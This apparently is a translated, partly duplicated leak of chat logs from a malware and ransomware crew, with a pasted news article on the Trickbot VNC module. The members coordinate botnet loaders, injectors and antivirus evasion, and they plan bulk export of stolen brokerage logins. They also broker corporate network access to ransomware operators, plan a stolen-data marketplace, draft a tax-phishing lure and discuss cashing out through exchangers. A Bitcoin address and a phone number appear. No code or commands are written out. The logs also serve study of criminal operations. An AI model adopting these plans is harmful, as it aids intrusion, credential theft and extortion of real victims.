3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. That on our system others already created their coins, exchanges and projects.

is this some kind of exchange?
Just a bts exchange for cash.
There's a shitload of fees.
Look for some other withdrawal options. 20% is fat.
[Error: the message is encrypted and can not be decrypted.]
I do not know, if you tell me where else you can easily exchange it for cash?
I don't know
Why don't you pay by card?
There's a 5-7 percent fee.
The unemployed have money on the card, that's why I was thinking about cash.
I may have to try another exchanger with cash sometime in the future

Hey how are you?
You're the one I remember working or not working for four months.
[Error: message encrypted and cannot be decrypted.]
Hi. How's it going?
What are your results?
What challenges are you facing?
What ideas are there to add and improve?
Are there any of us who consider ourselves blockchain gurus, and trends. Who might know where to go in this direction and what to develop... What ideas anyone has.
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other people can build their own coins, exchanges and projects on our system.

hello
ghbdtn
hi
you're quite the news reader.)
They send it to me.)
i went through all the coders and updated the current projects
if you need anything, i'm up to date on everything :)
[Error: the message is encrypted and cannot be decrypted.]
found an option to buy zuminfo account for 2 managers buse for reconnaissance price 2k
budget if you do not cheat of course, through a guarantor can be done
I remind you about the social network and a bunch more)
carbon there and so on.
:)
lf 2r
yeah 2k can be without a guarantor
on tom@ need to run it
from our side everything is ready a long time ago.
i can't get him to come to us. but sometimes i need him when our guys are on cleanup or can't get around it.
last 1k i gave him for balance
if his scheme doesn't work, get expensive certificates
order them
sign the backlog
you need to pay for test tasks, social network designer, I paid everything and put some money in advance to buy a modem, a security course...
...and then run it.
and i'd like my bits back and my carbon back...
and everyone probably got their paychecks and you don't even think about me)
let's get the bits back
How much do you remember, or should I write it all down again?
I don't remember, just tell me how much and that's it.
No need to sign off.
I do not remember how much, and that's it, no countersigning.
[28.06.2021 18:12:55] <mango> for the carbon I need to return 1.32 bitcoins at the rate on the day when I paid for it) and I also need to refund 12.5k for ST to new people from the last payment and the purchase of carbon itself dokidyl
and if you can send me the salary at once I will be very happy)
1.32 btz as of today at the rate of 44100 +12,500
56600
you can also send me a bonus so I have enough for C line :-D
i got the nets, i got the carbon, i got the social network, i got everyone's brains, i got everyone's brains
come on, just so I can work in the comfort of my own home.
you get a bonus from the people who sold you that carbon
which you don't need anymore
drop the coattails
We'll give them their money back, and let the carbon lying around, in case you need it later
I paid them back a long time ago
Yeah, I get it.
I'll pay you back.
It's like they waited a week, you left me no choice...
What's the difference?
And why don't you need it in the end?
No one to take care of it or what?
let's sell it, there's a demand for it
It's just that the crews wanted it.
They wanted to research it.
It took them a long time to make it
and then they gave it up
or made it themselves I don't know
Let's do our own research.
Well, in the end, we didn't bring it up with them.
I asked Prof.
if he wanted carbon
He said no, not yet.
Well, he could.
but no time
The bouza wants to explore on his own.
but he doesn't have a purpose why
you can give hors@
Talk to hors@.
send the cat.
let me and hors@ come up with something
about it.
I think he would be interested as they often have nets with carbon
What kind of social networking moves do you need?
on social networking.
We ended up wanting his goals and ideas so I don't make a big deal out of it.
I think it should be run with minimal functionality
well for now it's just a nice forum and closer to a social network
like this
balances, deposits theme people
message there , guarantor, etc
add Btz, ether and monero to accept payments
functionality in the course of the battle
not just btz

we need to understand how a social network should be
where is it selling something
where are the auctions etc.
So far, only deposits/payment between members? No exchange, etc.?
Maybe it could be merged with someone or something
maybe an exchanger or something
Think
I told you in my terms of reference what you can earn there
Let the designer draw it
you can make participants donate to each other for info/education
who drew the green
uh-huh
[14:52:19] <zevs@q3mcco35auwcstmt.onion> another question, send def on the archives, maybe we'll find something for trade, it's a good theme there profitable
all got it, build the framework, then we'll finish it
you there and did not give them the archive?
It's been a week.
even the bonus for zeus didn't motivate you
bc1qfamjhlyec63dz3gvcum7s9guu3cp5n8v3hz7ud
me 56600 + salary
give me bonuses for nets, containers, injectors, and other things in life)
on the s line so i'll be like a badass
1.32 is for carbon?
and it takes 3k to work
I won't give you anything for the windows
That's for the company they made the carbon for
because it's no use yet
Injectors too
I'm just saying)
I'm not tuning))))
at least get mine back)))))
I understand about the networks, your man is working with chors
I've been waiting three weeks.
we'll figure it out, is he still giving out nets?
yes
I'll get yours back.
bc1qfamjhlyec63dz3gvcum7s9guu3cp5n8v3hz7ud
here 1.32 ?
Yeah, but he's on vacation this week.
or how much
everything can be there
spaniard ?
Yeah, he'll be here on Mon.
Johnny's working too.
and a couple of other people in the process...
I gave vpns to reverse and there's silence.
I reminded him a couple of times, and now the guy who gave it is gone...
These tactics that kind of wait unneeded to drop out by themselves - bro I may not understand something here, but it seems to me that the drop out as a result of it just those who want to work right here and now ...
and those who just want to get paid will sit quietly and make minimal fuss...
in my opinion...
I don't understand anything...
but you understand it better than I do.
how to do it right.
No, I don't say that.)
I got 100 people here, half of them don't even do 10% of the work
and only ask for money because they think they're fucking useful
there's a guy named frog@ his nickname
He's a guy called frog@.
He didn't get paid for four months.
Then he knocked on the door.
He says I'm done with the tank.
Give me 4 months salary
I checked and really didn't take money
I asked him why didn't you write.
He says I wasn't satisfied with myself.
and there are those that you yourself do not understand why, but you say not to remove them.
when you're done, you write it down.
That's the kind of people we need
not those who ask for their salary every month and write
for example, the alky meeni os his lights and the drunken baguette
I have good crypts
Let him crypto.
the baguette will be clear in a month
he diavol finished the locker
♪ he's on the pro's test ♪
and his team
seems to be clean from av
baguette if you don't pay him he won't quit
he's asking for it but he won't quit
he won't drop out if you don't pay him for a year even
such a man
he's already stuck here.
He's handed in several projects.
It's just that I think a lot of people get complacent because you don't really ask, and then they always find ways to justify themselves
So the coder came in
they gave him 30k
before i brought up the fact that the styler isn't working properly and isn't looting - i was told everything was fine there
and told me to give me a clean loeder.
he gave me a looder after 3 weeks
until i poked it right there...
clean
the cleanest
we've had 16 people making lowers
for over a year.
there's no clean
and tl
etc.
well with bots like derek bro it's hard to keep it clean there i think
hey
If he's on the job he'll get caught quickly
It's the hands that matter.
You let me know.
I'm done with mine.
and when they're making 500 bots, 400 of them are Honeypots...
I need you to do some urgent work on the vault.
I didn't make any adjustments to the vault.
and i couldn't debug properly, i'm having trouble with the balls
i've just messed with the ingame module, everything was cleaned up, i asked for zevs to be attached - friday is the only day it was tested - and it was already burned during the test
Well, to check the write rights.
derek has one bk
and we have 5 or 6 of them
There is another point that almost all of them do not understand the full picture of how it works...
it's one thing for coders who have been working with Malware for a long time, but another thing is that our coders partially insert pieces of code and have never seen Troy before and they don't know how it should be and why
And those who know won't work for 2,000 rubles.
we're looking for new people on hack forums. the advert says 2k salary and there are lots of comments that we're recruiting slaves) we challenge that those who work and deliver results get more, etc... but examples show that coders who work well earn 5-10k... it's hard to make an agreement with them all
Juniors go for 2k...
there are only middlemen on hack forums
that's why they write there
in general, coders in russia for
intermediaries a shitload
from 60k rubles
up to 300k
for 300k to have a job, the coder should be very lucky
That's why I suggest that at the initial stage to create credibility and excitement, they should be allowed to work by sponsorship/voting.
google pays 300k in russia or microsoft pays top coders
firstly, it's purely for the geeks in the know, and the rest later, so they have a vested interest in joining us
like it was with thecc
thecc was shit
There's 10 cripples.
no action.
i got signed up there
i was there for a week
you must have seen it in the wrong days)
half a year later, I went back.
Nothing has changed.
it's the coolest forum in terms of people
thehack is English speaking
and verified
russian
there was a good movement towards the end when a fly became an admin, people tried to get there 2 or 3 times, he just started to organize moves, but unfortunately he was accepted and everything stopped abruptly
verfied was dumped in the spring
There should be at least 1 million people on social networks.
They have now recovered, apologized, and continue to work as if nothing had happened.
All the forums.
Look, why don't we do this as a white project?

That's fine.
Just with a footnote that we're not responsible for what goes on there.
It is a white project.
just a backdoor move.
)))
everyone will be there.
reporters
ordinary users
buyers
sellers
[Error: the message is encrypted and cannot be decrypted.]
hackers
carders
[Error: message encrypted and can't be decrypted.]
We need to get all the stores in one place.
to pay them there
and their percentage.
to order 20 percent.
I'm thinking, by the way, to move to Moscow and try to open a firm there on the PC, this plan has long been hatched ... to recruit first system field engineers, then pull a couple of designers / copywriters - advertising, and to pull cm, and as the staff is formed - you can take on outsourcing companies what things. it is clear that there is not much money, but 1 can gradually pick up the right people under 2 can rediably some gray themes do, such as a carbon-based
Well, you want to like on OZONE was like, site where virtual tenants offer products / services
specialize specifically on hackers and carders that is not going to?
In essence, this does not change anything. vichat in darknet, and that's all,
large forum with a convenient way to communicate and additional functionality. at the initial stage - what competitors have, advertising, deposits, etc., etc.
You need an idea and a gimmick to attract people not just to register once and forget about it, but to make them want to come back and hang out there all the time.
I have come up with all sorts of functional there and you do not appreciate it)))
not a good idea

10 years ago we should have
do
now it's better to run it from a laptop
no firms
and you need to hire people who understand and understand blockchain
there's all the dough
[15:14:05] <mango> you want it to be like on OZONE, a site where virtual tenants offer goods/services
[15:14:18] <mango> we won't specialize on hackers and carders?
yes
like hydra only for stolen data
plus forum
in different languages
forum is not the main topic
Trading is the main thing.
communication is second.
plus news
and discussions and so on.
We'll do that later.
Maybe we'll do a casino.
Same place.
Hi.
I'll be in touch.
What do you need done?

[15:16:21] <mango> I have invented so many things for this functionality there and you do not appreciate it somehow I think)))


The only thing I've appreciated so far is paying my employees their salaries (great, you got me off the hook) and the second thing is that you kind of matched it up with the horses.
Did you figure out how to pull the data from the storage?
I need two txt files from each admin room
to pull the data from each admin.
Country
Bot ID
link: etrade.com
login
pass
two txts are needed
[Error: message is encrypted and cannot be decrypted.]
per admin.
download all the accounts.
[Error: message encrypted and can't be decrypted.]
now and upload it to me in a zip archive with the password at sendspace.com.
[Error: message encrypted and can't be decrypted.]
Look, I don't care. You say what you need, I do it. I just wish it wasn't for nothing.
in the zipped archive again there should be two tht's. each tht's is an admin. and the pikes go all the way down
and i'm trying to make it all fancy.
I've been trying to get my imagination on a certain link to etrade.com.
and you don't even read it.
You say I want this and that.
You have to download from Browser Access.
Don't download without a password, only if you have a username and password.
but i've got it all figured out - you just haven't read it or gone into it
you say you need someone with an idea - i'm a better person than you) i'm into all this and do it for myself, but there are moments when you and your attention is indispensable
i asked you to decide if it's a social network, centralized or not, open source or not
In fact, you need acesses with login-password for a specific link etrade.com?
Download by both admins and drop via sendspace.com
is that correct?
and you don't even remember .
centralized
[Error: message is encrypted and cannot be decrypted.]
the code is closed
we're the only ones
so far.
Buddy, I want to make money with you and become a rich dude.
[Error: Message encrypted and cannot be decrypted.]
I think at some point you're going to say fuck it, I changed my mind, etc...
I got it...
[Error: message is encrypted and can't be deciphered.]
Well, you write a little more than usual.
I'll have a better sense of what's going on.
Yeah.
[Error: message encrypted and can't be deciphered]
and crying here.
Okay. .
in the order I wrote it.
I'm not used to writing the same thing for 2-3 weeks and I don't even get a response... then tomorrow and I'm gone for a week...
hello
biceps red on the left
i'm all for a ruckus, but if i'm going to jail, it's for something really important and interesting

so at least you won't be ashamed of being in jail
[Error: Message encrypted and can't be decrypted.]
in two weeks you could have a social network.
I'm thinking about keeping 20 people.
the rest of you, take out the lndoogs here at toadstools.
[Error: Message encrypted and can't be decrypted.]
Give them to the booze.
and take away the 20 people I can move the world with.
hello
what's up?
Are you with the driver now?
this is a good solution. the team should be stable and tasks should be distributed, otherwise it will end up with a shitload of people and the overall project will not work
[Error: message encrypted and can't be decrypted.]
[Error: message encrypted and can't be decrypted.]
There's no connection to the tournament, by the way?
he's got the importdll module, he's got a super browser on him, I wish I could at least get the source code, he hasn't shown up for months.
importDll is similar to bill@
he did it
all these modules - you're saying that we need the adversaries - but damn bro they won't go if we don't have anything to offer them... That's why as long as the trike is our website it has to be the benchmark.
♪ and tunny's sources are at def's git ♪
he only cleaned
the source of the import is, there is no source of the superbrowser
the bank theme is dead.
i don't know what else you want to squeeze out)
even the researchers are fucked up.
you're adding an injector to the trike)
the new adverts all work on the injector
everyone's surprised!)
and by the way, everything's pouring out, bro.
come on, let's see.
i don't talk to anyone - everyone is pouring. it's complicated but it all works
who's pouring?
aZ I had before - now the type loads 3-4k bots a week, pours on 100 150k a week
Zeus is a new guy - they also work for US by token.
YS is good in general, but you need to know the themes there
as far as i understand, they work with Cookies + login passwords
and the stuff goes too ... it's all small and we are not interested I understand it all
but it's interesting to the adversaries, they'll maximize the profits of their loyads
[15:31:13] <mango> aZ that I had before - now type loads 3-4k bots a week, pours 100 150k a week


Take his corps.
i'm sure he'll make more than 100-150k a week with us
for 3-4k bots.
they're ready. i offered them a job on the trike.
they said that trike is a dirty shit no one supports))))
i tried my best to justify myself but it was hard to argue))))
it was like that for a while, now hof has cleaned it up for zeus
give him a bk.
but trike has a worm.
he can turn 3k bots into 10k bots
there's something wrong with the imported dll, some of it was fixed, but some of the problems remain. plus the injector didn't work right, plus the styler isn't robbing everything) in short, there's something to fuck with
and the most important thing everyone wants is a vntz normal
and reproduction is debatable if you're working on the Injams, because when you reproduce bots immediately subnets fall off... and as far as I understood the bots from the reproduction does not go to their admin office and in some ...
they have their moments everywhere, but now they are working on it, in a month or two everything will be fine.
I'll be gone for a couple of hours, don't forget to send me some beats.
[Error: Message encrypted and can't be decrypted.]

I think we got it.
You'll hear from the coder, you can ask him technical questions too.
[Error: message is encrypted and can't be decrypted.]
1) we want to create our own crypto system like:
etherium, polkadot and binance smart chain etc.

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others already created their coins, exchanges and projects on our system.

The bots from breeding will go to them
Yeah, got it.
do you have any idea how the repository works?
I downloaded 1.32
What else do you need?
Hi
who do you upload hash@ bots to?
Hi, there were no bots. I gave one big bot to reverse, but they could not jump
But if it's 10k or so, then it's to Horses.
Bobi not yet discounted, because there is nothing. I try to divide it between Horses and Bobi
Have you ever had anything over 10k?
Yes there were a couple, but there either could not jump or off went corp
[Error: message encrypted and can't be decrypted.]
[Error: message encrypted and can't be decrypted.]
[Error: message is encrypted and cannot be decrypted.]
Yes
[Error: message encrypted and cannot be decrypted.]
[Error: message encrypted and cannot be decrypted.]
19 total there, over 10kk was 5pc, 3 off, in the other 2 couldn't jump
[Error: message encrypted and can't be decrypted.]
[Error: message encrypted and can't be decrypted.]
He says there were 500-600 bots
Yeah) I wish. There's still glitchy admin, I can not tell how many with vg, but 500-600 there was definitely not. Maximum 100 with the Vg, and that's unlikely.
There alone avs. 14760, and 19 corps - all.
For bots in general now is bad. In general, do not go. Tomorrow will try bk with balzac.
Here's the deal.
In general, I found the code which is responsible for unloading, judging by everything it was ground up a little bit on a different format. There reference type rackspace and format brief.
I managed to upload in link:login:pass format. Setting format, that you're asking there is also, but I have not been able to do it yet.
In this regard, 3 questions.
1. How critical will it be if I complete this upload tomorrow?
2. does it have to be an exact link match or should yurls like app.servisetrade.com also be in the sample?
Bot Id, is it its datatype like 971BB5287788095B1DBBCCA9B8CA3BB2 or internal ID in the admin like 156789678?

Uh, now if only a fork of some blockchain is done, it could take years to create from scratch. The basic trilem of blockchains: speed of transactions, security and scalability.

Hello!
Hello
о
please tell me the following
My specs for the loader say that it should be able to work through a proxy-server
you can write a proxy server on the server?
what server?
I don't know?
It's written in the ToR. I am puzzled, and my team leader avoids talking, said - must test to the administrator, they will prescribe a proxy server
apparently this must be written on the test machines
as far as the runtime is concerned, the admin has nothing to do with the loader
send me your terms of reference
I'll just copy the phrase, there's one sentence
on this subject

The loader should support operation through a proxy, if it is specified in the settings of the operating system (inetcpl.cpl -> Connection -> Proxy settings).
Apparently, it is assumed that the loader enters the system, where the output to the Internet is through a proxy server, and should not get confused. But how?
you can't give me a name of a prog with a loader, so i can address them on this topic?

2) Does anyone know about this in detail?

3) Study these above system, code, working principles. To build our own, where it will be already possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So, other people will create their own coins, exchanges and projects on our system.

hi
<salamandra> can you tell me how to deal with new admins? i find them via e-mail i send to greene and he checks and says they fit. i then write to him to get them into the system and then send them to the projects that need it. In the end, even those who were interviewed and came to us are sitting and no one writes them anything. i don't know who is in juey because they communicate with grin in juey. and as a result, they hang up and no one informs me anything. it feels like i work idle. somehow, this point should be adjusted
[03:00:50] <salamandra> because stern will ask me where the people are. and i'll tell him ask greene
[03:01:07] <salamandra> I can't supervise them because I don't know their nickname.

Nothing's dying down, just evolving.
Hi.
Ok, I was wondering what I could do, I'll probably try copying the supervisor configs from dnog to auction
I'm here, I'll look into it now
Hey, .
Did you see the messages?
Yes
About the grabber thing.
I'll have to look into it.
What about the configs?
Well, Love says it's slowing down.
It's slowing down. You say the bots are empty.
Everything works fine on dnog.
In theory, if I copy the configs for the supervisor from there should work like on dnog.
That's if I try quickly.
Or I could still try to figure out why this is happening.
And then that would take time.
And with the grabber, I'll figure it out. I'm on it.
Try replacing the config.
Just save this one to roll it back.
Yeah, that's understandable.
hi
hey
otr?)
Hi
Let me see.
Okay
Nothing came back.
What should I do?
Can you do 10 more?
I don't care, I'll pay again.
Come on, I'll do it.
Okay.
Hey. .
Hi.
How did you end up with the domains after the reboot?

Thank you🙌
Hi
Some of the ransomware operations using this botnet for network access include the infamous Ryuk, Conti, REvil, as well as a new one called Diavol, the Romanian for Devil.

Since Emotet's takedown by law enforcement, Trickbot activity started to increase to such levels that in May it was the most prevalent malware on Check Point's radar.

The malware maintained its position this month, too, the cybersecurity company notes in a report today, adding that Trickbot's maintainers are constantly working to improve it.

According to Check Point's telemetry, Trickbot impacted 7% of organizations across the world, followed by the XMRig cryptocurrency miner the Formbook info stealer, which affected 3% of the organizations that Check Point monitors worldwide.
New VNC module in the works

In another report, Romanian cybersecurity company Bitdefender says that its systems caught a new version of Trickbot's VNC module (vncDLL), used after compromising high-profile targets.

The updated module is called tvncDLL and allows the threat actor to monitor the victim and collect information that would enable pivoting to valuable systems on the network.

Although tvncDLL was discovered on May 12, the Romanian researchers say that it is still under development, "since the group has a frequent update schedule, regularly adding new functionalities and bug fixes."

Bitdefender's analysis of the module points out that it uses a custom communication protocol and reaches the command and control (C2) server through one of nine proxy IP addresses that enable access to victims behind firewalls.

Trickbot's tvncDLL module attack overview

The VNC component can stop Trickbot and unload it from memory. When an operator initiates communication, the module creates a virtual desktop with a custom interface.

"During normal operation, the alternate desktop is created and fully controlled by the module, copying the icons from the desktop, creating a custom taskbar for managing its processes and creating a custom right-click menu, containing custom functionality," Bitdefender researchers write in their report.

Right click menu for Trickbot's tvncDLL

Using the command prompt, the threat actor can download fresh payloads from the C2 server, open documents and the email inbox, steal data from the compromised system.

Another option called Native Browser fires up a web browser by taking advantage of the OLE automation feature in Internet Explorer.

The function is under development and its purpose is to steal passwords from Google Chrome, Mozilla Firefox, Opera, and Internet Explorer.

Trickbot's tvncDLL Native Browser feature

The researchers say that while the old vncDLL module has been in use since at least 2018, its successor became active in the wild on May 11, 2021, according to evidence revealed during their investigation.

Telemetry data from Bitdefender data shows Trickbot's C2 servers spread on almost all continents, with the largest number (54) located in North America. According to the company, the number of C2 servers has increased significantly this year, jumping from around 40 in January to more than 140 in June.

1) writes either the tax office (well, it is unlikely to believe it) or some kind of consultant, etc. tax.
The gist - in your declaration (application for a tax deduction, a letter to the tax office, etc.) detected an error. And here in this form, fill in the necessary data .
the form in the attachment.
Well, a little there can neatly scare - like in the case..... will be taken and sanctions will be imposed.

Some of the ransomware operations using this botnet for network access include the infamous Ryuk, Conti, REvil, as well as as a new one called Diavol, the Romanian for Devil.

Since Emotet's takedown by law enforcement, Trickbot activity started to increase to such levels that in May it was the most prevalent malware on Check Point's radar.

The malware maintained its position this month, too, the cybersecurity company notes in a report today, adding that Trickbot's maintainers are constantly working to improve it.

According to Check Point's telemetry, Trickbot impacted 7% of organizations across the world, followed by the XMRig cryptocurrency miner the Formbook info stealer, which affected 3% of the organizations that Check Point monitors worldwide.
New VNC module in the works

In another report, Romanian cybersecurity company Bitdefender says that its systems caught a new version of Trickbot's VNC module (vncDLL), used after compromising high-profile targets.

The updated module is called tvncDLL and allows the threat actor to monitor the victim and collect information that would enable pivoting to valuable systems on the network.

Although tvncDLL was discovered on May 12, the Romanian researchers say that it is still under development, "since the group has a frequent update schedule, regularly adding new functionalities and bug fixes."

Bitdefender's analysis of the module points out that it uses a custom communication protocol and reaches the command and control (C2) server through one of nine proxy IP addresses that enable access to victims behind firewalls.

Trickbot's tvncDLL module attack overview

The VNC component can stop Trickbot and unload it from memory. When an operator initiates communication, the module creates a virtual desktop with a custom interface.

"During normal operation, the alternate desktop is created and fully controlled by the module, copying the icons from the desktop, creating a custom taskbar for managing its processes and creating a custom right-click menu, containing custom functionality," Bitdefender researchers write in their report.

Right click menu for Trickbot's tvncDLL

Using the command prompt, the threat actor can download fresh payloads from the C2 server, open documents and the email inbox, steal data from the compromised system.

Another option called Native Browser fires up a web browser by taking advantage of the OLE automation feature in Internet Explorer.

The function is under development and its purpose is to steal passwords from Google Chrome, Mozilla Firefox, Opera, and Internet Explorer.

Trickbot's tvncDLL Native Browser feature

The researchers say that while the old vncDLL module has been in use since at least 2018, its successor became active in the wild on May 11, 2021, according to evidence revealed during their investigation.

Telemetry data from Bitdefender data shows Trickbot's C2 servers spread on almost all continents, with the largest number (54) located in North America. According to the company, the number of C2 servers has increased significantly this year, jumping from around 40 in January to more than 140 in June.

Anyway, the last time he ran pvgrab was on 17.
We didn't get it done at 3:00 a.m., maybe it didn't get done.
Now he's off, I tried to look through the logs to find something - a lot of errors, I need to finish dero to rule out that the pool has a password in a different encoding
Now a lot of problems with it.
Maybe he also has an example of a bot
Which didn't make it.
But it's alive.

There's another guy who's got a lot of ADP access, but he wants a lot of money... I say let's get it for 2 hours without AP... Initially he charged 50, says he works this way with several affiliates...



[22:18:47] <rdpcorp_@thesecure.biz> what types of access do you work with? forti vpn, rdp, citrix, cisco?
[22:18:48] <traffz007> i'm a direct project helpdesk, not an intermediary or anyone else, if you're there in the subject and you know our boss can make sure
[22:18:53] <traffz007> yes all take
[22:19:12] <traffz007> you can in the form of bots, you can in the form of access, rdp, no problem
[22:19:15] <rdpcorp_@thesecure.biz> don't know, but certainly for the locker conti heard)
[22:19:19] <rdpcorp_@thesecure.biz> forti vpn familiar too?
[22:19:21] <traffz007> if there is no AD it's not a problem, we'll get it in a couple of hours
[22:19:25] <traffz007> yeah sure
[22:26:05] <rdpcorp_@thesecure.biz> discussed with his, for 35% agree, if there is no AD then agree for 15%, but such we have very rare, if you agree from you person / people who are often online, yes to throw a mate to work and panel)
[22:26:38] <traffz007> let's take without Hell then, 35 chief will not give
[22:26:50] <traffz007> 25 usually, there we give 30 to the most expensive guests, 35 will not give
[22:27:04] <traffz007> I can make access to our toadstool and there connect with hacker operator
[22:27:23] <traffz007> and you contact them directly there, they will give you access to chats, etc.
[22:27:57] <rdpcorp_@thesecure.biz> well it makes no sense just less, we say 50/50 work, but there's still affiliate take their 20%, but since you have 100% ready to pay for 35... the mat will be a lot and stable, there are 10-15 nets a week, of course there are less... say 3-5, not always as they say "catch" good
[22:28:27] <traffz007> got it, I'll offer it to the boss, if he agrees I'll write back
[22:28:34] <rdpcorp_@thesecure.biz> okay

You can get good money through the exchangers from the U.S. accounts, non-transparent
The amounts are very good.
I've got 5k.

There's another guy who's got a lot of ADP access, but he wants a lot of money... I say let's get it for 2 hours without AP... Initially he charged 50, says he works this way with several affiliates...



[22:18:47] <rdpcorp_@thesecure.biz> what types of access do you work with? forti vpn, rdp, citrix, cisco?
[22:18:48] <traffz007> i'm a direct project helpdesk, not an intermediary or anyone else, if you're there in the subject and know our boss you can make sure
[22:18:53] <traffz007> yes all take
[22:19:12] <traffz007> you can in the form of bots, you can in the form of access, rdp, no problem
[22:19:15] <rdpcorp_@thesecure.biz> don't know, but certainly for the locker conti heard)
[22:19:19] <rdpcorp_@thesecure.biz> forti vpn familiar too?
[22:19:21] <traffz007> if there is no AD it's not a problem, we'll get it in a couple of hours
[22:19:25] <traffz007> yeah sure
[22:26:05] <rdpcorp_@thesecure.biz> discussed with his, for 35% agree, if there is no AD then agree for 15%, but such we have very rare, if you agree from you person / people who are often online, yes to throw a mate to work and panel)
[22:26:38] <traffz007> let's take without Hell then, 35 chief will not give
[22:26:50] <traffz007> 25 usually, there we give 30 to the most expensive guests, 35 will not give
[22:27:04] <traffz007> I can make access to our toadstool and there connect with hacker operator
[22:27:23] <traffz007> and you contact them directly there, they will give you access to chats, etc.
[22:27:57] <rdpcorp_@thesecure.biz> well it makes no sense just less, we say 50/50 work, but there's still affiliate take their 20%, but since you have 100% ready to pay for 35... the mat will be a lot and stable, there are 10-15 nets a week, of course there are less... say 3-5, not always as they say "catch" good
[22:28:27] <traffz007> got it, I'll offer it to the boss, if he agrees I'll write back
[22:28:34] <rdpcorp_@thesecure.biz> okay

are there any exchange owners?
in short, exchangers can request money from the account
banyans for example
I have accounts with large balances, but the banks are self-registered and cannot send money from them, just pulling money from them, exchanges is the norm, but the top exchanges limit 5k per day, I thought maybe you have the owners of exchanges

There are different options for the logo, fonts and design in general and a little promo material for the start, description and functionality, development plan. That's my suggestion here. Also there are 2 more proposals thrown Buza, but if I emphasized more on the functionality, he is there more for the technical part.

And attached a few articles from the eksploit contest, you can try to pull these guys if you like the authorship of some of them.
I pulled up a team of arbitrageurs, they do global traffic from fb and google, they have their own loader but they deal with cryptotheme in general, I offered them to try to work on networks, I say you do the traffic, we ourselves monitor networks, if anything we share, and the logs on crypto and others that will come - all to them. Should start next week.

Tom is also kind of starting on Mondays, we provided him with everything he needed.

I received an offer from a type of competitors, affiliate crylock - they say they are there like broke, they have pentesters, targeting, they only need a locker. I said okay, we'll give them 30%, they refused, they said a lot. I must squeeze them and try to steal their adversaries and pentester, I think how to pull this))).

 " akonitborec@thesecure.biz I'm actually the administrator of another cryptolocker, not so popular - crylock. And there we have a hitch now and we will rewrite it, it's a long time. So, not to lose my work, I'm looking for a new partner for the locker. I have several pentester teams, several stand-alone pentesters, and my taggers, of all kinds. I only need a locker, but actually 30% would not work for me. Because the big teams I had were working for a lower percentage, and I still have to earn something from administration. Your locker was in my hands from intermediaries and I tested it, it is not bad, so I wrote. If you have a more interesting % offer, I'm willing to consider it. "


We got some pentesters there, found some more coders this week, and recruitment is slowly progressing.

Collected all the reports on the modules and bugs trike, while the main problem we have importdll and superbrowser, everything else works fine, all cleaned up/updated. With vnts still not clear, but all in progress
By the way here is another loader with an admin in torah. just for arbitrageurs. Only written, in combat, was not, and runs with OB sertom bypassing smarscreen. If you suddenly need for what topics...
hello
Hi
Question from a subscriber (admin coder):

Listen, you do not know by any chance why in the admin area is the corporate section?
It's where it accumulates domains that pass through us and collects titles like title, description
Is it in use right now?

1. How do the open resumes count?
You can open as many resume tabs as you want and see all the information except the contact information. If you click on the "Open Contacts" button, you will be credited with 1 view. At the bottom of the program you can see how many resumes you have available.
 
2. How do I pay for a resume package?
First you determine how many resumes you need and pay in advance for the necessary amount. If you don't have enough resumes, you can buy more by giving me 24 hours' notice.
 
3. How many resumes can I look at in a day?
As many as you want as part of your package, even all in one day.
 
4. What do you mean resumes can burn out?
For example, if you pay the rate for a week or a month, your resumes will be open during that period. We pay for a year, so resumes won't burn out.
 
4. Will some resumes be open?
Yes, some resumes are already open to you, and over time they will be 30-35% open. That is, out of 10 resumes, about 3 will be available.
 
5. How do I get access?
The cabinet is accessed through a special program - this is dictated by security conditions. Otherwise, everything is the same.
  
6. How many people can use a purchased cabinet?
One cabinet - one user, if you need more users, buy an additional cabinet.
 
7. At what point does the access time begin to run?
As soon as I sent the login/password.
We're interested in this: 3. Renting our office on Hh

   - month: 7 tr;
   - Week: 4 tr;
   - 3 days: 3 rub;
   - day: 2 tr.

For each resume pay in advance 60 rubles. (instead of 73). You can open as many tabs with resumes as you want and see all information except contact information, and pay only for the resumes you need. Also open resumes are not burned, and available for a year. About 25% of resumes will be free for you, because they are already open by other managers of our company.

If you still have questions, here is my number working, I'll tell you everything in detail 89062696551

Hi
https://privnote.com/ZabqaAR0#WZAkf4Nql
bro here?
[Error: message is encrypted and cannot be decrypted.]
There's a teht and pictures in the archive.

123123098098!!!
https://privatlab.com/s/v/AEE6gRkkN0f74V0N9JjD
https://privatlab.com/s/d/AEE6gRkkN0f74V0N9JjD/G3obq#delete

There are different options for the logo, fonts and design in general and a little promo material for the start, description and functionality, development plan. That's my suggestion here. Also there are 2 more proposals thrown Buza, but if I emphasized more on the functionality, he is there more for the technical part.

And attached a few articles from the eksploit contest, you can try to pull these guys if you like the authorship of some of them.
I pulled up a team of arbitrageurs, they do global traffic from fb and google, they have their own loader but they deal with cryptotheme in general, I offered them to try to work on networks, I say you do the traffic, we ourselves monitor networks, if anything we share, and the logs on crypto and others that will come - all to them. Should start next week.

Tom is also kind of starting on Mondays, we provided him with everything he needed.

I received an offer from a type of competitors, affiliate crylock - they say they are there like broke, they have pentesters, targeting, they only need a locker. I said okay, we'll give them 30%, they refused, they said a lot. I must squeeze them and try to steal their adversaries and pentester, I think how to pull this))).

 " akonitborec@thesecure.biz I'm actually the administrator of another cryptolocker, not so popular - crylock. And there we have a hitch now and we will rewrite it, it's a long time. So, not to lose my work, I'm looking for a new partner for the locker. I have several pentester teams, several stand-alone pentesters, and my taggers, of all kinds. I only need a locker, but actually 30% would not work for me. Because the big teams I had were working for a lower percentage, and I still have to earn something from administration. Your locker was in my hands from intermediaries and I tested it, it is not bad, so I wrote. If you have a more interesting % offer, I'm willing to consider it. "


We got some pentesters there, found some more coders this week, and recruitment is slowly progressing.

Collected all the reports on the modules and bugs trike, while the main problem we have importdll and superbrowser, everything else works fine, all cleaned up/updated. With vnts still not clear, but all in progress
By the way here is another loader with an admin in torah. just for arbitrageurs. Only written, in combat, was not, and runs with OB sertom bypassing smarscreen. If you suddenly need for what topics.
Question from a subscriber (coder admin):

Listen, you do not know by any chance why in the admin area is the corporate section?
It's where it accumulates domains that pass through us and collects titles like title, description
Is it in use right now?

